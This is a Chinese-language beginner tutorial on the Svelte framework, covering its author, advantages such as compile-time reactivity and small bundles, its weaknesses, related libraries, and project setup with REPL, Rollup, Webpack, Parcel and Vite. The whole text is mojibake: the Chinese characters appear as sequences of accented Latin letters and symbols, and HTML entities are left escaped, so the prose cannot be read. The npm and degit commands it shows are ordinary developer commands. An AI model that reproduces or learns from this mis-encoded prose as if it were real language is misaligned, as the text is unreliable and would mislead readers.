èƒ½è®“ç¥–å¸«çˆºä¹Ÿé‡è¦–çš„æ¡†æ¶ï¼Œä¸ç°¡å–®ä¸ç°¡å–®~\næˆ‘å–œæ­¡ç”¨ Demo çš„æ–¹å¼å­¸ç¿’æ–°æŠ€è¡“ï¼ŒSvelte å®˜æ–¹å…¥é–€æ•™ç¨‹ å°±æä¾›äº†é€™ç¨®æ–¹å¼ã€‚\né€™æ˜¯æˆ‘è¦ºå¾—å…¥é–€æ¯”è¼ƒèˆ’æœä¸”æ–¹ä¾¿æ—¥å¾Œæœç´¢çš„å­¸ç¿’æ–¹å¼ã€‚\né›–ç„¶ Svelte å®˜æ–¹å…¥é–€æ•™ç¨‹ å·²ç¶“çµ¦å‡ºå¾ˆå¤šä¾‹å­ï¼Œè€Œä¸” Svelteä¸­æ–‡ç¶² ä¹Ÿæœ‰å°æ‡‰çš„ç¿»è­¯ï¼Œä½†æœ‰äº›ç¿»è­¯çœ‹ä¸Šå»æ˜¯æ©Ÿè­¯ï¼Œè€Œä¸”éƒ¨åˆ†æ¡ˆä¾‹å¯èƒ½ä¸å¤ªé©åˆæ–°æ‰‹å­¸ç¿’~\næœ¬æ–‡çš„ç›®çš„æ˜¯æŠŠ Svelte çš„å­¸ç¿’æµç¨‹æ¢³ç†å‡ºä¾†ï¼Œè®“ç¬¬ä¸€æ¬¡æ¥è§¸ Svelte çš„å·¥å‹èƒ½é †åˆ©ä¸Šæ‰‹ã€‚\næœ¬æ–‡é©åˆäººç¾¤ï¼šæœ‰HTMLã€CSSã€JSåŸºç¤ï¼ŒçŸ¥é“ä¸¦å·²ç¶“å®‰è£äº†Nodeã€‚\nå¦‚æœä½ æ˜¯æ‰“ç®—å¾0é–‹å§‹å­¸ç¿’å‰ç«¯ï¼Œé‚£æœ¬æ–‡æš«æ™‚é‚„ä¸é©åˆä½ é–±è®€ã€‚\nSvelte ç°¡ä»‹ Svelte æ˜¯ä¸€å€‹æ§‹å»ºweb æ‡‰ç”¨ç¨‹åºçš„å·¥å…·ã€‚\nå‚³çµ±æ¡†æ¶å¦‚React å’ŒVue åœ¨ç€è¦½å™¨ä¸­éœ€è¦åšå¤§é‡çš„å·¥ä½œï¼Œè€ŒSvelte å°‡é€™äº›å·¥ä½œæ”¾åˆ°æ§‹å»ºæ‡‰ç”¨ç¨‹åºçš„ç·¨è­¯éšæ®µä¾†è™•ç†ã€‚\néœ€è¦æ³¨æ„ï¼ŒSvelte æ˜¯ä¸€æ¬¾ç·¨è­¯å™¨ã€‚å®ƒå¯ä»¥å°‡æŒ‰ç…§è¦å®šèªæ³•ç·¨å¯«çš„ä»£ç¢¼æ‰“åŒ…æˆç€è¦½å™¨èƒ½é‹è¡Œçš„é …ç›®ã€‚\nå’Œå…¶ä»–å‰ç«¯æ¡†æ¶ä¸€æ¨£ï¼ŒåŒæ¨£ä¹Ÿæ˜¯ä½¿ç”¨HTMLã€CSS å’Œ JavaScript é€²è¡Œé–‹ç™¼ã€‚\nä½œè€… åœ¨å­¸ç¿’ Svelte ä¹‹å‰å…ˆäº†è§£ä¸€ä¸‹å®ƒçš„çˆ¶è¦ªï¼ˆä½œè€…ï¼‰ã€‚\nSvelte çš„ä½œè€…å« Rich Harris\nå¯èƒ½åœ‹å…§å¤§å¤šæ•¸å·¥å‹å°ä»–ä¸æ˜¯å¾ˆç†Ÿæ‚‰ï¼ˆæˆ‘ä¹Ÿå®Œå…¨ä¸ç†Ÿï¼‰ï¼Œä½†æ‡‰è©²è½é Rollupã€‚\næ²’éŒ¯ï¼Œä»–ä¹Ÿæ˜¯ Rollup çš„çˆ¸çˆ¸ã€‚\nä»–åœ¨é–‹ç™¼ Svelte ä¹‹å‰é‚„é–‹ç™¼é Ractive.jsï¼Œè½èªª Vue çš„éƒ¨åˆ†å¯¦ç¾ä¹Ÿæ˜¯å—åˆ°äº† Ractive çš„å•Ÿç™¼ã€‚\né—œæ–¼ Rich Harris çš„ä»‹ç´¹é‚„æœ‰å¾ˆå¤šï¼Œæˆ‘æœåˆ°çš„è³‡æ–™ä¸Šé€™æ¨£ä»‹ç´¹åˆ°ï¼š\nå¤§å­¸å°ˆæ¥­æ˜¯å­¸å“²å­¸çš„ åœ¨ç´ç´„æ™‚å ±èª¿æŸ¥çµ„å·¥ä½œçš„åœ–å½¢ç·¨è¼¯ï¼Œèº«å…¼è¨˜è€…å’Œé–‹ç™¼è€…è·ä½ é‚„æœ‰æ›´å¤šé—œæ–¼ä»–å’Œ Svelte çš„ä»‹ç´¹ï¼Œå¯ä»¥çœ‹çœ‹ã€ŠSvelte - The magical disappearing UI framework - Interview with Rich Harrisã€‹\nSvelte çš„å„ªå‹¢ Svelte ç¿»è­¯æˆä¸­æ–‡å°±æ˜¯ è‹—æ¢ çš„æ„æ€ï¼Œå´é¢è¡¨æ˜å®ƒæ‰“åŒ…å‡ºä¾†çš„åŒ…éå¸¸å°ã€‚\nSvelte ä¸»è¦å„ªå‹¢æœ‰ä»¥ä¸‹å¹¾é»ã€‚\nç·¨è­¯å™¨ åœ¨æ‰“é–‹ Svelteå®˜ç¶² æ™‚å°±èƒ½çœ‹åˆ°é€™æ¨£çš„ä»‹ç´¹ã€‚\nSvelte æ˜¯ä¸€ç¨®å…¨æ–°çš„æ§‹å»ºç”¨æˆ¶ç•Œé¢çš„æ–¹æ³•ã€‚å‚³çµ±æ¡†æ¶å¦‚ React å’Œ Vue åœ¨ç€è¦½å™¨ä¸­éœ€è¦åšå¤§é‡çš„å·¥ä½œï¼Œè€Œ Svelte å°‡é€™äº›å·¥ä½œæ”¾åˆ°æ§‹å»ºæ‡‰ç”¨ç¨‹åºçš„ç·¨è­¯éšæ®µä¾†è™•ç†ã€‚\nSvelte çµ„ä»¶éœ€è¦åœ¨ .svelte å¾Œç¶´çš„æ–‡ä»¶ä¸­ç·¨å¯«ï¼ŒSvelte æœƒå°‡ç·¨å¯«å¥½çš„ä»£ç¢¼ç¿»ç·¨è­¯ JS å’Œ CSS ä»£ç¢¼ã€‚\næ‰“åŒ…é«”ç©æ›´å° Svelte åœ¨æ‰“åŒ…æœƒå°‡å¼•ç”¨åˆ°çš„ä»£ç¢¼æ‰“åŒ…èµ·ä¾†ï¼Œè€Œæ²’å¼•ç”¨éçš„ä»£ç¢¼å°‡æœƒè¢«éæ¿¾æ‰ï¼Œæ‰“åŒ…æ™‚ä¸æœƒåŠ å…¥é€²ä¾†ã€‚\nåœ¨ ã€ŠA RealWorld Comparison of Front-End Frameworks with Benchmarks (2019 update)ã€‹ å ±å‘Šä¸­ï¼Œå°ä¸»æµæ¡†æ¶é€²è¡Œäº†å°æ¯”ã€‚\nåœ¨ç¶“é gzip å£“ç¸®å¾Œç”Ÿæˆçš„åŒ…å¤§å°ï¼Œå¾å ±å‘Šä¸­å¯ä»¥çœ‹å‡ºï¼ŒSvelte æ‰“åŒ…å‡ºä¾†çš„é«”ç©ç”©é–‹ Vueã€React å’Œ Angular å¹¾æ¢è¡—ã€‚\né€™æ˜¯å› ç‚ºç¶“é Svelte ç·¨è­¯çš„ä»£ç¢¼ï¼Œåƒ…ä¿ç•™å¼•ç”¨åˆ°çš„éƒ¨åˆ†ã€‚\nä¸ä½¿ç”¨ Virtual DOM Virtual DOM å°±æ˜¯ è™›æ“¬DOMï¼Œæ˜¯ç”¨ JS å°è±¡æè¿° DOM ç¯€é»çš„æ•¸æ“šï¼Œç”± React åœ˜éšŠæ¨å»£å‡ºä¾†çš„ã€‚\nè™›æ“¬DOM æ˜¯å‰ç«¯çš„ç¶²ç´…ï¼Œå› æ­¤ä¹Ÿæœ‰å¾ˆå¤šé–‹ç™¼è€…é–‹å§‹ç ”ç©¶å’Œæè¾¯è«–è³½ã€‚\nç¶²ä¸Šæœ‰ä¸€å¼µåœ–å°æ¯”äº† Svelte å’Œ React åœ¨æ•¸æ“šé©…å‹•è¦–åœ–çš„æµç¨‹\nå…¶å¯¦ä¸»è¦å°æ¯”äº†ä½¿ç”¨è™›æ“¬DOMå’Œç›´æ¥æ“ä½œçœŸå¯¦DOMçš„å€åˆ¥ã€‚ åœ¨ React ä¸­å¯¦ç¾æ•¸æ“šé©…å‹•è¦–åœ–å¤§æ¦‚æµç¨‹æ˜¯é€™æ¨£çš„ï¼š\n1 æ•¸æ“šç™¼ç”Ÿè®ŠåŒ– -\u0026gt; é€šédiffç®—æ³•åˆ¤æ–·è¦æ›´æ–°å“ªäº›ç¯€é» -\u0026gt; æ‰¾åˆ°è¦æ›´æ–°çš„ç¯€é» -\u0026gt; æ›´æ–°çœŸå¯¦DOM Vue çš„æ•¸æ“šæ›´æ–°åŸç†å…¶å¯¦ä¹Ÿå·®ä¸å¤šï¼Œåªæ˜¯å¯¦ç¾æ–¹å¼å’Œä½¿ç”¨èªæ³•æœƒæœ‰æ‰€ä¸åŒã€‚\ndiffç®—æ³• æœƒæ ¹æ“šæ•¸æ“šæ›´æ–°å‰å’Œæ›´æ–°å¾Œç”Ÿæˆçš„è™›æ“¬DOMé€²è¡Œå°æ¯”ï¼Œåªæœ‰å…©å€‹ç‰ˆæœ¬çš„è™›æ“¬DOMå­˜åœ¨å·®ç•°æ™‚ï¼Œæ‰æœƒæ›´æ–°å°æ‡‰çš„çœŸå¯¦DOMã€‚\nä½¿ç”¨è™›æ“¬DOMå°æ¯”çš„æ–¹å¼æœƒæ¯”ç›´æ¥å°æ¯”çœŸå¯¦DOMçš„æ•ˆç‡é«˜ã€‚\nè€Œä¸”çœŸå¯¦DOMèº«ä¸Šæ›è¼‰çš„å±¬æ€§å’Œæ–¹æ³•éå¸¸å¤šï¼Œä½¿ç”¨è™›æ“¬DOMçš„æ–¹å¼å»æè¿°DOMç¯€é»æ¨¹æœƒé¡¯å¾—æ›´è¼•ä¾¿ã€‚\nä½†é€™ä¹Ÿæ„å‘³è‘—æ¯æ¬¡æ•¸æ“šç™¼ç”Ÿè®ŠåŒ–æ™‚éƒ½è¦å…ˆå‰µå»ºä¸€å€‹è™›æ“¬DOMï¼Œä¸¦ä½¿ç”¨ diffç®—æ³• å°‡æ–°è™›æ“¬DOMèˆ‡èˆŠè™›æ“¬DOMé€²è¡Œæ¯”å°ï¼Œé€™å€‹æ­¥é©Ÿæœƒæ¶ˆè€—ä¸€é»æ€§èƒ½å’Œéœ€è¦ä¸€é»åŸ·è¡Œæ™‚é–“ã€‚\nè€Œ Svelte åœ¨æœªä½¿ç”¨è™›æ“¬DOMçš„æƒ…æ³ä¸‹å¯¦ç¾äº†éŸ¿æ‡‰å¼è¨­è¨ˆã€‚\næˆ‘ä»¥ç²—æš´çš„æ–¹å¼ç†è§£ï¼šSvelte æœƒç›£è½é ‚å±¤çµ„ä»¶æ‰€æœ‰è®Šé‡ï¼Œä¸€æ—¦æŸå€‹è®Šé‡ç™¼ç”Ÿè®ŠåŒ–ï¼Œå°±æ›´æ–°ä½¿ç”¨éè©²è®Šé‡çš„çµ„ä»¶ã€‚é€™å°±åƒ…åƒ…åªéœ€æ›´æ–°å—å½±éŸ¿çš„é‚£éƒ¨åˆ†DOMå…ƒç´ ï¼Œè€Œä¸éœ€è¦æ•´å€‹çµ„ä»¶æ›´æ–°ã€‚\nç¶œä¸Šæ‰€è¿°ï¼Œåœ¨æˆ‘çš„ç†è§£åŠ›ï¼Œè™›æ“¬DOMçš„æ€æƒ³å¾ˆå„ªç§€ï¼Œä¹Ÿæ˜¯é †æ‡‰æ™‚ä»£çš„ç”¢ç‰©ï¼Œä½†è™›æ“¬DOMä¸¦ä¸æ˜¯æœ€å¿«çš„ï¼ŒJS ç›´æ¥æ“ä½œ DOM æ‰æ˜¯æœ€å¿«ã€‚\nã€ŠVirtual DOM is pure overheadã€‹æ˜¯ Svelte å®˜ç¶²ä¸Šçš„ä¸€ç¯‡åšå®¢ï¼Œå°ˆé–€è¨è«–è™›æ“¬DOMã€‚æœ‰èˆˆè¶£çš„å·¥å‹å¯ä»¥çœ‹çœ‹~\næ›´è‡ªç„¶çš„éŸ¿æ‡‰å¼ é€™è£¡èªªçš„éŸ¿æ‡‰å¼è¨­è¨ˆæ˜¯åªé—œæ–¼æ•¸æ“šçš„éŸ¿æ‡‰ï¼Œè€Œä¸æ˜¯åƒ Bootstrap çš„éŸ¿æ‡‰å¼ä½ˆå±€ã€‚\nç¾åœ¨æµè¡Œçš„å‰ç«¯æ¡†æ¶åŸºæœ¬éƒ½ä½¿ç”¨ æ•¸æ“šé©…å‹•è¦–åœ– é€™å€‹æ¦‚å¿µï¼Œåƒ Vue å’Œ React é€™äº›æ¡†æ¶ï¼Œéƒ½æœ‰éŸ¿æ‡‰å¼æ•¸æ“šçš„æ¦‚å¿µã€‚\nä½† Vue å’Œ React åœ¨æ•¸æ“šéŸ¿æ‡‰æ–¹é¢é‚„æ˜¯æœ‰é»ä¸é‚£éº¼è‡ªç„¶ï¼Œæˆ‘ç°¡å–®èˆ‰å¹¾å€‹ä¾‹å­ï¼š\nåœ¨ React ä¸­ï¼Œå¦‚æœéœ€è¦æ›´æ–°æ•¸æ“šä¸¦åœ¨è¦–åœ–ä¸­éŸ¿æ‡‰ï¼Œéœ€è¦ä½¿ç”¨ setState æ–¹æ³•æ›´æ–°æ•¸æ“šã€‚\nåœ¨ Vue2 ä¸­ï¼ŒéŸ¿æ‡‰å¼æ•¸æ“šè¦æ”¾åœ¨ data è£¡ï¼Œåœ¨ methods ä¸­ä½¿ç”¨ this.xxx ä¾†æ›´æ–°æ•¸æ“šã€‚\nåœ¨ Vue3 çš„ Composition API èªæ³•ä¸­ï¼Œéœ€è¦ä½¿ç”¨ ref æˆ–è€… reactive ç­‰æ–¹æ³•åŒ…è£¹æ•¸æ“šï¼Œä½¿ç”¨ xxx.value ç­‰æ–¹å¼ä¿®æ”¹æ•¸æ“šã€‚\nä¸Šé¢é€™å¹¾ç¨®æƒ…æ³ï¼Œæ„Ÿè¦ºå¤šå°‘éƒ½æ·»åŠ äº†é»æ±è¥¿æ‰èƒ½å¯¦ç¾éŸ¿æ‡‰å¼æ•¸æ“šåŠŸèƒ½ï¼ˆè‡³å°‘åœ¨æ™®é€šé–‹ç™¼è€…é–‹ç™¼æ™‚æ˜¯é€™æ¨£ï¼‰ã€‚\nåœ¨ Svelte çš„ç†å¿µä¸­ï¼ŒéŸ¿æ‡‰å¼æ‡‰è©²çµ¦é–‹ç™¼è€…ä¸€ç¨®ç„¡æ„Ÿé«”é©—ï¼Œæ¯”å¦‚åœ¨ Excel ä¸­ï¼Œç•¶æˆ‘è¦å®š C1 å–®å…ƒæ ¼çš„å€¼æ˜¯ A1 + B1 çš„å’Œï¼Œè¨­ç½®å¥½è¦å‰‡å¾Œï¼Œç”¨æˆ¶åªéœ€è¦ä¿®æ”¹ A1 å’Œ B1 å³å¯ï¼ŒC1 æœƒè‡ªå‹•éŸ¿æ‡‰ï¼Œè€Œä¸éœ€å†åšå…¶ä»–æ“ä½œã€‚\nåœ¨é€™æ–¹é¢ï¼ŒSvelte æˆ‘èªç‚ºåœ¨ç¾éšæ®µæ˜¯åšå¾—æœ€è‡ªç„¶çš„ã€‚\n1 2 3 4 5 6 7 8 9 \u0026lt;h1\u0026gt;{name}\u0026lt;/h1\u0026gt; \u0026lt;script\u0026gt; let name = \u0026#39;é›·çŒ´\u0026#39; setTimeout(() =\u0026gt; { name = \u0026#39;é¯Šé­šè¾£æ¤’\u0026#39; }, 1000) \u0026lt;/script\u0026gt; ä¸Šé¢çš„ä»£ç¢¼ä¸­ï¼Œ1ç§’å¾Œä¿®æ”¹ name çš„å€¼ï¼Œä¸¦æ›´æ–°è¦–åœ–ã€‚\nå¾ä»£ç¢¼å°±èƒ½çœ‹å‡ºï¼Œåœ¨ä½¿ç”¨ Svelte é–‹ç™¼é …ç›®æ™‚ï¼Œé–‹ç™¼è€…ä¸€èˆ¬ç„¡éœ€ä½¿ç”¨é¡å¤–çš„æ–¹æ³•å°±èƒ½åšåˆ°å’Œ Vueã€React çš„éŸ¿æ‡‰å¼æ•ˆæœã€‚\nå¦‚æœä½ å° Svelte éŸ¿æ‡‰å¼åŸç†æ„Ÿèˆˆè¶£ï¼Œæ¨è–¦é–±è®€ FESKY çš„ ã€ŠSvelte éŸ¿æ‡‰å¼åŸç†å‰–æâ€”â€” é‡æ–°æ€è€ƒReactivityã€‹\nä¹Ÿå¯ä»¥çœ‹çœ‹ ã€ŠRethinking reactivityã€‹ï¼Œçœ‹çœ‹å®˜æ–¹å° reactivity çš„æ€è€ƒã€‚\næ€§èƒ½å¼· Stefan Krause çµ¦å‡ºä¸€ä»½ æ€§èƒ½æ¸¬è©¦å ±å‘Šï¼ˆé»æ“Šå¯æŸ¥çœ‹ï¼‰ å°æ¯”é‡Œå¤šå€‹ç†±é–€æ¡†æ¶çš„æ€§èƒ½ã€‚å¾ Svelte çš„æ€§èƒ½æ¸¬è©¦çµæœå¯ä»¥çœ‹å‡ºï¼ŒSvelte æ˜¯ç›¸ç•¶å„ªç§€çš„ã€‚\nå…§å­˜å„ªåŒ– æ€§èƒ½æ¸¬è©¦å ±å‘Šï¼ˆé»æ“Šå¯æŸ¥çœ‹ï¼‰ ä¹Ÿåˆ—å‡ºä¸åŒæ¡†æ¶çš„å…§å­˜ä½”ç”¨ç¨‹åº¦ï¼ŒSvelte å°å…§å­˜çš„ç®¡ç†åšåˆ°éå¸¸æ¥µè‡´ï¼Œä½”ç”¨çš„å…§å­˜ä¹Ÿæ˜¯éå¸¸å°ï¼Œé€™å°æ–¼é…ç½®ä¸é«˜çš„è¨­å‚™ä¾†èªªæ˜¯ä»¶å¥½äº‹ã€‚\nç¬¬5ã€6é»ï¼Œç”±æ–¼æ¸¬è©¦å ±å‘Šæ¯”è¼ƒé•·ï¼Œæˆ‘æ²’æˆªåœ–æ”¾é€²æ–‡ä¸­ã€‚å¤§å®¶æœ‰èˆˆè¶£å¯ä»¥é»é–‹éˆæ¥æŸ¥çœ‹æ¸¬è©¦å ±å‘Šã€‚\næ›´é—œæ³¨ç„¡éšœç¤™é«”é©— åœ¨ä½¿ç”¨ Svelte é–‹ç™¼æ™‚æœƒ è‡ªå‹•å°ç„¡éšœç¤™è¨ªå•æ–¹é¢çš„é«”é©—é€²è¡Œæª¢æ¸¬ï¼Œæ¯”å¦‚ img å…ƒç´ æ²’æœ‰æ·»åŠ  alt å±¬æ€§ï¼ŒSvelte æœƒå‘ä½ ç™¼å‡ºä¸€æ¢è­¦å‘Šã€‚ç„¡éšœç¤™é«”é©—å°ç‰¹æ®Šäººäº‹ä¾†èªªæ˜¯å¾ˆæœ‰å¹«åŠ©çš„ï¼Œæ¯”å¦‚ç•¶ä½ åœ¨ img æ¨™ç±¤ä¸­è¨­ç½®å¥½ alt å±¬æ€§å€¼ï¼Œä½¿ç”¨æœ‰è²ç€è¦½å™¨æœƒæŠŠ alt çš„å…§å®¹è®€å‡ºä¾†ã€‚\nåœ¨æ­¤æˆ‘é‚„è¦æ¨è–¦2æœ¬é—œæ–¼è¨­è¨ˆé«”é©—çš„æ›¸ã€‚\nã€Šé»çŸ³æˆé‡‘ï¼šè¨ªå®¢è‡³ä¸Šçš„Webå’Œç§»å‹•å¯ç”¨æ€§è¨­è¨ˆç§˜ç¬ˆã€‹ ã€ŠåŒ…å®¹æ€§Webè¨­è¨ˆã€‹ å®ƒå€‘çš„å°é¢é•·åˆ†åˆ¥é€™å€‹æ¨£å­\nSvelte çš„å„ªå‹¢è‚¯å®šé‚„æœ‰å¾ˆå¤šï¼Œä½†ç”±æ–¼æˆ‘é–‹ç™¼ç¶“é©—ä¸è¶³ï¼Œåªèƒ½ç¸½çµå‡ºä»¥ä¸Šé€™äº›äº†ã€‚å¦‚æœä½ å° Svelte æœ‰æ›´å¤šç†è§£ï¼Œæ­¡è¿åœ¨è©•è«–å€è£œå……~\nSvelte çš„ä¸è¶³ Svelte å° IE æ˜¯éå¸¸ä¸å‹å¥½çš„ï¼Œä½†æˆ‘ä¸¦ä¸æŠŠé€™æ”¾åœ¨çœ¼è£¡ã€‚å¦‚æœæƒ³å…¼å®¹ IE æˆ‘é‚„æ˜¯æ¨è–¦ä½¿ç”¨ jQueryã€‚ Svelte çš„ç”Ÿæ…‹ä¸å¤ è±å¯Œã€‚ç”±æ–¼æ˜¯æ–°å¯µï¼Œç”Ÿæ…‹æ–¹é¢è‚¯å®šæ˜¯ä¸å¦‚ Vue å’Œ React çš„ã€‚ èˆ‡ Svelte ç›¸é—œçš„åº« Sapper Sapper å®˜ç¶²åœ°å€\nSapper æ˜¯æ§‹å»ºåœ¨Svelte ä¸Šçš„æ¡†æ¶ï¼ŒSapper æä¾›äº†é é¢è·¯ç”±ã€ä½ˆå±€æ¨¡æ¿ã€SSRç­‰åŠŸèƒ½ã€‚\nSvelte Native Svelte Native å®˜ç¶²åœ°å€\nSvelte Native æ˜¯å»ºç«‹åœ¨ NativeScript ä¹‹ä¸Šçš„ç”¢ç‰©ï¼Œå¯ä»¥é–‹ç™¼å®‰å“å’ŒiOSæ‡‰ç”¨ï¼Œæ˜¯ä¸€å€‹è·¨ç«¯æŠ€è¡“ã€‚\næœ‰é»é¡ä¼¼æ–¼ React Native å’Œ Weex ä¹‹é¡çš„æ±è¥¿ã€‚\nsvelte-gl svelte-gl Github\nsvelte-gl é‚„æ²’æ­£å¼ç™¼å¸ƒï¼Œä½†é€™æ˜¯å€‹å¾ˆæœ‰è¶£çš„å·¥å…·ï¼Œå®ƒå’Œthree.jsé¡ä¼¼ï¼Œå°ˆé–€åš3Dæ‡‰ç”¨çš„ã€‚\né›–ç„¶ç¾åœ¨ github ä¸Šçš„ Star é‚„ä¸æ˜¯å¾ˆå¤šï¼Œä½†ä¹Ÿå¯ä»¥å¯«äº› demo ç©ç©ã€‚\nå‰µå»ºé …ç›® åœ¨é–‹å§‹ä¹‹å‰ï¼Œä½ éœ€è¦åœ¨é›»è…¦ä¸Šå®‰è£Nodeç’°å¢ƒ(v16+)ã€‚\nç·¨è¼¯å·¥å…·æˆ‘ä½¿ç”¨äº† VS Codeï¼ŒåŒæ™‚å®‰è£äº† Svelte for VS Code æ“´å±•æ’ä»¶ã€‚\nä½¿ç”¨ Svelte å‰ï¼Œå¿…é ˆæœ‰ä¸€å€‹é–‹ç™¼ç’°å¢ƒã€‚\nå‰µå»ºæˆ–ä½¿ç”¨é–‹ç™¼ç’°å¢ƒæœ‰ä»¥ä¸‹å¹¾ç¨®æ–¹å¼ï¼š\nREPL Rollupç‰ˆ Webpackç‰ˆ Parcelç‰ˆ Viteç‰ˆ æœ¬æ–‡ä½¿ç”¨çš„æ˜¯ Vite å‰µå»ºé …ç›®ï¼Œä½†ä¸Šé¢åˆ—å‡ºçš„æ‰€æœ‰æ–¹å¼æˆ‘éƒ½æœƒé€ä¸€èªªèªªã€‚\nREPL REPLæ˜¯ Svelte æä¾›çš„ä¸€å€‹ç·šä¸Šç’°å¢ƒï¼Œæ‰“é–‹ Svelte å®˜ç¶² å¯ä»¥çœ‹åˆ°é ‚éƒ¨å°èˆªæ¬„ä¸Šé¢æœ‰å€‹ REPL çš„é¸é …ã€‚é»æ“Šè©²é¸é …å°±å¯ä»¥è·³è½‰åˆ° Svelte ç·šä¸Šé–‹ç™¼ç’°å¢ƒäº†ã€‚\nREPL æ˜¯ read(è®€å–)ã€evaluate(åŸ·è¡Œ)ã€print(æ‰“å°) å’Œ loop(å¾ªç’°) é€™å¹¾å€‹å–®è©çš„ç¸®å¯«ã€‚\nå¦‚æœä½ åªæ˜¯æƒ³å˜—è©¦ Svelte çš„æŸäº›åŠŸèƒ½æˆ–è€…æ¸¬è©¦å°å‹ä»£ç¢¼ï¼Œå¯ä»¥ä½¿ç”¨é€™æ¬¾ç·šä¸Šå·¥å…·ã€‚\nREPLé‚„æä¾›äº†å¤šçµ„ä»¶é–‹ç™¼ï¼ŒæŒ‰å·¦ä¸Šè§’çš„ ï¼‹ å¯ä»¥å‰µå»ºæ–°çµ„ä»¶ã€‚çµ„ä»¶çš„å…§å®¹ç¨å¾Œæœƒèªªåˆ°ã€‚\nç•Œé¢å³å´ï¼Œé ‚éƒ¨æœ‰3å€‹é¸é …ï¼š\nResultï¼š é‹è¡Œçµæœã€‚ JS outputï¼š Svelte ç·¨è­¯å¾Œçš„ JS ä»£ç¢¼ã€‚ CSS outputï¼š Svelte ç·¨è­¯å¾Œçš„ CSS ä»£ç¢¼ã€‚ åœ¨ REPL ç•Œé¢å³ä¸Šè§’é‚„æœ‰ä¸€å€‹ä¸‹è¼‰æŒ‰éˆ•ã€‚\nç•¶ä½ åœ¨ç·šä¸Šç’°å¢ƒå¯«å¥½ä»£ç¢¼ï¼Œå¯ä»¥é»æ“Šä¸‹è¼‰æŒ‰éˆ•æŠŠé …ç›®ä¿å­˜åˆ°æœ¬åœ°ï¼Œä¸‹è¼‰çš„æ–‡ä»¶æ˜¯ä¸€å€‹ zipï¼Œéœ€è¦è‡ªå·±æ‰‹å‹•è§£å£“ã€‚\nç„¶å¾Œä½¿ç”¨ä»¥ä¸‹å‘½ä»¤åˆå§‹åŒ–é …ç›®ä¸¦é‹è¡Œå³å¯ã€‚\n1 2 3 4 5 6 7 # 1. åˆå§‹åŒ–é …ç›® npm install # 2. é‹è¡Œé …ç›® npm run dev # 3. åœ¨ç€è¦½å™¨è¨ªå• http://localhost:5000 é‹è¡Œçµæœï¼š\nRollup ç‰ˆ Svelte å®˜æ–¹ä¹Ÿæä¾›äº†ä¸€å€‹å‘½ä»¤ï¼Œå¯ä»¥ä¸‹è¼‰ Svelte é …ç›®åˆ°æœ¬åœ°ã€‚\nå‘½ä»¤æœ€å¾Œéœ€è¦è¼¸å…¥ä½ çš„é …ç›®åç¨±ã€‚\n1 2 3 4 5 6 7 8 9 10 # 1. ä¸‹è¼‰æ¨¡æ¿ npx degit sveltejs/template é …ç›®åç¨± # 2. å®‰è£ä¾è³´ npm install # 3. é‹è¡Œé …ç›® npm run dev # 4. åœ¨ç€è¦½å™¨è¨ªå• http://localhost:8080 é‹è¡Œçµæœï¼š\né€™æ˜¯å®˜æ–¹æä¾›çš„å‰µå»ºé …ç›®æ–¹å¼ï¼Œé€™å€‹é …ç›®æ˜¯ä½¿ç”¨ Rollup æ‰“åŒ…çš„ã€‚ Rollup å’Œ Svelte éƒ½æ˜¯åŒä¸€å€‹ä½œè€…ï¼ˆRich Harrisï¼‰é–‹ç™¼çš„ï¼Œç”¨å›è‡ªå®¶æ±è¥¿å¾ˆæ­£å¸¸ã€‚\nWebpack ç‰ˆ å¦‚æœä½ ä¸æƒ³ä½¿ç”¨ Rollup æ‰“åŒ…é …ç›®ï¼Œå¯ä»¥å˜—è©¦ä½¿ç”¨ Webpackã€‚\n1 2 3 4 5 6 7 8 9 10 # 1. ä¸‹è¼‰æ¨¡æ¿ npx degit sveltejs/template-webpack é …ç›®åç¨± # 2. å®‰è£ä¾è³´ npm install # 3. é‹è¡Œé …ç›® npm run dev # 4. åœ¨ç€è¦½å™¨è¨ªå• http://localhost:8080 é‹è¡Œçµæœï¼š\nParcel ç‰ˆ æˆ‘ä¸¦ ä¸æ¨è–¦ä½¿ç”¨ è©²æ–¹æ³•å‰µå»ºé …ç›®ï¼Œå› ç‚ºSvelte ä¸¦æ²’æœ‰æä¾›ä½¿ç”¨Parcel æ‰“åŒ…å·¥å…·çš„æ¨¡æ¿ã€‚ä½† GitHub ä¸Šæœ‰ç¬¬ä¸‰æ–¹çš„è§£æ±ºæ–¹æ¡ˆï¼ˆé»æ“Šè¨ªå•å€‰åº«ï¼‰ã€‚\nå°‡DeMoorJasper/parcel-plugin-svelteçš„ä»£ç¢¼ä¸‹è¼‰ä¸‹ä¾†ã€‚\n1 2 3 4 5 6 7 8 9 # 1. é€²å…¥ `packages/svelte-3-example` ç›®éŒ„ # 2. å®‰è£ä¾è³´ npm install # 3. é‹è¡Œé …ç›® npm run start # 4. åœ¨ç€è¦½å™¨è¨ªå• http://localhost:1234 é‹è¡Œçµæœï¼š\nVite ç‰ˆ æœ¬æ–‡æ¥ä¸‹ä¾†æ‰€æœ‰ä¾‹å­éƒ½æ˜¯ä½¿ç”¨ Vite å‰µå»º Svelte é …ç›®é€²è¡Œé–‹ç™¼çš„ã€‚\nä½¿ç”¨ Vite å‰µå»ºé …ç›®çš„åŸå› æ˜¯ï¼šå¿«ï¼\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 # 1. ä¸‹è¼‰æ¨¡æ¿ npm init vite@latest # 2. è¼¸å…¥é …ç›®åç¨± # 3. é¸æ“‡ Svelte æ¨¡æ¿(æˆ‘æ²’é¸ts) # 4. å®‰è£ä¾è³´ npm install # 5. é‹è¡Œé …ç›® npm run dev # 6. åœ¨ç€è¦½å™¨è¨ªå• http://127.0.0.1:5173 é‹è¡Œçµæœï¼š\næœ¬æ–‡ä½¿ç”¨ Vite å‰µå»ºé …ç›®ï¼Œç›®éŒ„çµæ§‹å’ŒRollupç‰ˆå‰µå»ºå‡ºä¾†çš„é …ç›®çµæ§‹ç¨å¾®æœ‰é»ä¸åŒï¼Œä½†é–‹ç™¼é‚è¼¯æ˜¯ä¸€æ¨£çš„ã€‚\nèµ·æ­¥ index.htmlã€src/main.js å’Œ src/App.svelte é€™ä¸‰å€‹æ˜¯æœ€ä¸»è¦çš„æ–‡ä»¶ã€‚\nindex.html æ˜¯é …ç›®é‹è¡Œçš„å…¥å£æ–‡ä»¶ï¼Œå®ƒè£¡é¢å¼•ç”¨äº† src/main.js æ–‡ä»¶ã€‚\nsrc/main.js è£¡å¼•å…¥äº† src/App.svelte çµ„ä»¶ï¼Œä¸¦ä½¿ç”¨ä»¥ä¸‹ä»£ç¢¼å°‡ src/App.svelte çš„å…§å®¹æ¸²æŸ“åˆ° #app å…ƒç´ è£¡ã€‚\n1 2 